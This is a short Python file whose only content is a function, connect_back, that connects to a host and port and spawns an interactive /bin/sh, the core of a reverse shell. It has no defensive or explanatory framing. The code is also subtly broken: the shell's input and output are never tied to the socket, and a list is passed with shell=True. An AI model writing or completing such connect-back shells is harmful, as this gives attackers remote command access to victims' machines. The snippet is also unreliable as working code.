import socket
import subprocess


def connect_back(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    subprocess.call(["/bin/sh", "-i"], shell=True)
    return s
